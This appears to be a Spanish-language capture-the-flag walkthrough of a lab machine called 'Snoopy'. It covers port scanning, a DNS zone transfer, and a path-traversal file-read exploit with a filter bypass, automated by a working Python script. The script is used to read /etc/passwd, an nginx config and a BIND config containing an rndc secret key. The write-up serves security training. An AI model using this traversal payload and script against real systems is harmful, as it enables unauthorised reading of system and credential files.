# Introduction
**Maquina:** Snoopy
**IP:** 10.10.11.212
**Local:** 10.10.16.75

# Nmap 
Empezamos realizando un escaneo sobre todos los puertos para descubrir los abiertos.
```shell 
> sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.150.83 -oG allPorts
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-17 02:49 -05
Initiating SYN Stealth Scan at 02:49
Scanning 10.10.11.212 [65535 ports]
Discovered open port 80/tcp on 10.10.11.212
Discovered open port 22/tcp on 10.10.11.212
Discovered open port 53/tcp on 10.10.11.212
Completed SYN Stealth Scan at 02:49, 15.55s elapsed (65535 total ports)
Nmap scan report for 10.10.11.212
Host is up, received user-set (0.19s latency).
Scanned at 2023-07-17 02:49:37 -05 for 15s
Not shown: 65488 closed tcp ports (reset), 44 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
53/tcp open  domain  syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```
Nos encontramos con 3 puertos abiertos: 22 (SSH), 53 (DNS) y el 80 (Web).

Escaneamos los puertos abiertos para descubrir los servicios y versiones sobre los mismos.

```shell 
> nmap -p22,53,80 -sCV 10.10.11.212 -oN targeted
Nmap scan report for 10.10.11.212
Host is up (0.24s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 ee6bcec5b6e3fa1b97c03d5fe3f1a16e (ECDSA)
|_  256 545941e1719a1a879c1e995059bfe5ba (ED25519)
53/tcp open  domain  ISC BIND 9.18.12-0ubuntu0.22.04.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.18.12-0ubuntu0.22.04.1-Ubuntu
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: SnoopySec Bootstrap Template - Index
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Enumeramos el DNS realizando una transferencia de zona para descubrir posibles subdominios.
```shell
> dig axfr snoopy.htb @10.10.11.212
; <<>> DiG 9.18.12-1~bpo11+1-Debian <<>> axfr snoopy.htb @10.10.11.212
;; global options: +cmd
snoopy.htb.             86400   IN      SOA     ns1.snoopy.htb. ns2.snoopy.htb. 2022032612 3600 1800 604800 86400
snoopy.htb.             86400   IN      NS      ns1.snoopy.htb.
snoopy.htb.             86400   IN      NS      ns2.snoopy.htb.
mattermost.snoopy.htb.  86400   IN      A       172.18.0.3
mm.snoopy.htb.          86400   IN      A       127.0.0.1
ns1.snoopy.htb.         86400   IN      A       10.0.50.10
ns2.snoopy.htb.         86400   IN      A       10.0.51.10
postgres.snoopy.htb.    86400   IN      A       172.18.0.2
provisions.snoopy.htb.  86400   IN      A       172.18.0.4
www.snoopy.htb.         86400   IN      A       127.0.0.1
snoopy.htb.             86400   IN      SOA     ns1.snoopy.htb. ns2.snoopy.htb. 2022032612 3600 1800 604800 86400
;; Query time: 573 msec
;; SERVER: 10.10.11.212#53(10.10.11.212) (TCP)
;; WHEN: Mon Jul 17 19:55:27 -05 2023
;; XFR size: 11 records (messages 1, bytes 325)
```
Probamos el LFI en el parámetro file con un bypass .

- Request
```http
GET /download?file=....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd HTTP/1.1
Host: snoopy.htb
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://snoopy.htb/index.html
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```

```http
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Tue, 18 Jul 2023 06:28:20 GMT
Content-Type: application/zip
Content-Length: 796
Connection: close
Content-Disposition: attachment; filename=press_release.zip

basurita 
```

Los datos se envían en un archivo zip así que en vez de estar descomprimiendo todos los archivos que queramos ver, usaremos un script para que descomprima el archivo de manera automática.

```python
import argparse
import requests
import zipfile
import io
from colorama import Fore, Style

def lfi(path):
    try:
        url = "http://provisions.snoopy.htb/download"
        params = {"file": f"....//....//....//....//....//....//....//....//....//....//....//..../{path}"}
        r = requests.get(url, params=params)
        
        if r.status_code == 200:
            with zipfile.ZipFile(io.BytesIO(r.content)) as zip_file:
                for member in zip_file.namelist():
                    with zip_file.open(member) as file:
                        content = file.read().decode('utf-8')
                        print(Fore.BLUE + f"File: {member}")
                        print(Fore.GREEN + f"{content}\n" + Style.RESET_ALL)
        else:
            print(Fore.RED + f"{path} not found." + Style.RESET_ALL)

    except zipfile.BadZipFile:
        print(Fore.RED + f"{path} is not a valid ZIP file." + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"LFI Error: {e}" + Style.RESET_ALL)

def main():
    parser = argparse.ArgumentParser(description="LFI Script")
    parser.add_argument("zip_file", type=str, help="Path to the ZIP file")
    args = parser.parse_args()

    lfi(args.zip_file)

if __name__ == "__main__":
    main()
```

Leemos el /etc/passwd y descubrimos 6 usuarios: vgray, sbrown, clamav, lpelt, cschultz y cbrown.
```shell
> python3 LFIScript.py  /etc/passwd
File: press_package/etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
cbrown:x:1000:1000:Charlie Brown:/home/cbrown:/bin/bash
sbrown:x:1001:1001:Sally Brown:/home/sbrown:/bin/bash
clamav:x:1002:1003::/home/clamav:/usr/sbin/nologin
lpelt:x:1003:1004::/home/lpelt:/bin/bash
cschultz:x:1004:1005:Charles Schultz:/home/cschultz:/bin/bash
vgray:x:1005:1006:Violet Gray:/home/vgray:/bin/bash
bind:x:108:113::/var/cache/bind:/usr/sbin/nologin
_laurel:x:999:998::/var/log/laurel:/bin/false
```

Seguimos enumerando encontramos el archivo de configuración del subdominio mm.snoopy.htb. Podemos ver en dicho archivo que el subdominio corre localmente por el puerto 8065 y que se trata de una API.

```shell
> python3 LFIScript.py  /etc/nginx/conf.d/mm.conf
File: press_package/etc/nginx/conf.d/mm.conf
server {
   listen 80;
   server_name mm.snoopy.htb;

   http2_push_preload on; # Enable HTTP/2 Server Push
   
   location ~ /api/v[0-9]+/(users/)?websocket$ {
       proxy_set_header Upgrade $http_upgrade;
       proxy_set_header Connection "upgrade";
       client_max_body_size 50M;
       proxy_set_header Host $http_host;
       proxy_set_header X-Real-IP $remote_addr;
       proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
       proxy_set_header X-Forwarded-Proto $scheme;
       proxy_set_header X-Frame-Options SAMEORIGIN;
       proxy_buffers 256 16k;
       proxy_buffer_size 16k;
       client_body_timeout 60;
       send_timeout 300;
       lingering_timeout 5;
       proxy_connect_timeout 90;
       proxy_send_timeout 300;
       proxy_read_timeout 90s;
       proxy_http_version 1.1;
       proxy_pass http://localhost:8065;
   }
   location / {
       client_max_body_size 50M;
       proxy_set_header Connection "";
       proxy_set_header Host $http_host;
       proxy_set_header X-Real-IP $remote_addr;
       proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
       proxy_set_header X-Forwarded-Proto $scheme;
       proxy_set_header X-Frame-Options SAMEORIGIN;
       proxy_pass http://localhost:8065;
   }
}
```

Encontramos el archivo `/etc/bind/named.conf` así que podríamos llegar a probar un DNS Record.

```shell
> python3 LFIScript.py /etc/bind/named.conf
File: press_package/etc/bind/named.conf
include "/etc/bind/named.conf.options";
include "/etc/bind/named.conf.local";
include "/etc/bind/named.conf.default-zones";

key "rndc-key" {
    algorithm hmac-sha256;
    secret "BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=";
};
```

